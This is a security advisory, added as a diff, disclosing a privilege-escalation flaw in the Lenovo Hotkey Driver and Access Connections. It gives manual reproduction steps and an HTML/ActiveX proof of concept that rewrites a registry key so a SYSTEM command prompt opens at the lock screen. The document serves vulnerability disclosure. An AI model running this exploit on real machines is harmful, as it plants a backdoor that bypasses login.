@@ -1,0 +1,56 @@
+Author: Chilik Tamir - Amdocs Power Security Testing Group
+Website: http://invalid-packet.blogspot.com/2010/03/full-disclosure-security-vulnerability.html
+Subject: Security vulnerability <Privilege escalation> in Lenovo Hotkey Driver and Access Connections version <=v5.33
+Impact:
+A privilege escalation attack can be used as a backdoor to bypass login and run arbitrary code as a System user on Lenovo or Thinkpad laptops running Access Connection v5.33 and earlier versions (tracked back to version 4)
+
+
+Technical details: 
+&#65533;	The Hotkey Driver is an Lenovo application that monitors the Lenovo special Hotkeys (Fn keys) and execute Lenovo specified applications upon their invocation.
+&#65533;	The default installation of the Hotkey Driver is as a service and runs under NT Authority\System privileges. 
+&#65533;	Upon hot key detection, the Hotkey driver checks the registry key for the specified file to lunch and evokes that file, as example When the Fn + F5 key combination is pressed the Hotkey driver checks the registry key named File at HKEY_LOCAL_MACHINE\SOFTWARE\IBM\TPHOTKEY\CLASS\01\05 for its value and then launches the specified application (by default, Tp/AcFnF5.exe). 
+&#65533;	The Hotkey driver is available even prior to Windows login due to its installation configuration. 
+&#65533;	The value of the registry key to be lunched is not verified at invocation time. 
+&#65533;	This key is not monitored by the operating system and any change to this key is undetected. 
+&#65533;	An attacker with restricted access to the registry can use this information to launch a targeted attack on Lenovo or Thinkpad users that changes this key into an arbitrary application that runs with System permission. 
+Reproduce: 
+ 
+Using the target laptop change the File registry key value at HKEY_LOCAL_MACHINE\SOFTWARE\IBM\TPHOTKEY\CLASS\01\05 from 'Tp/AcFnF5.exe' to 'cmd.exe'. 
+Lock the station ('Windows' + 'L'). 
+Press 'Fn'+'F5' and a windows command prompt opens with System privilege. 
+ 
+Mitigation:
+Please update Hotkey Driver and Access connection to the most updated version (link here) at Lenovo website
+ 
+Exploit example: 
+This html exploit code uses ActiveX to hijack the Access connection hot key. (Please run on a Virtualized environment). 
+-----------code starts here----------
+<head>
+<script language="javaScript" type="text/javascript">
+myobject = new ActiveXObject("WScript.Shell")
+function install()
+{
+uri="HKEY_LOCAL_MACHINE\\SOFTWARE\\IBM\\TPHOTKEY\\CLASS\\01\\05";
+tag="\\"
+var value="File";
+var data="cmd.exe";
+myobject.run("reg.exe"+" copy "+uri+" "+uri+"\\backup "+" /f ");
+myobject.run("reg.exe"+" ADD "+uri+" /v "+value+" /d "+data+" /f ");
+value="Parameters";
+data="/T:74";
+myobject.run("reg.exe"+" ADD "+uri+" /v "+value+" /d "+data+" /f ");
+}
+function remove()
+{
+uri="HKEY_LOCAL_MACHINE\\SOFTWARE\\IBM\\TPHOTKEY\\CLASS\\01\\05";
+myobject.run("reg.exe"+" copy "+uri+"\\backup "+uri+" /f ");
+
+
+}
+</script>
+
+</head><body>
+<h1>Lenovo Access Connection Exploite POC<h1>
+<button onclick="install()">Install RootKit</button><P><button onclick="remove()">Remove RootKit</button>
+</body></html>
+---------code ends here------------ 
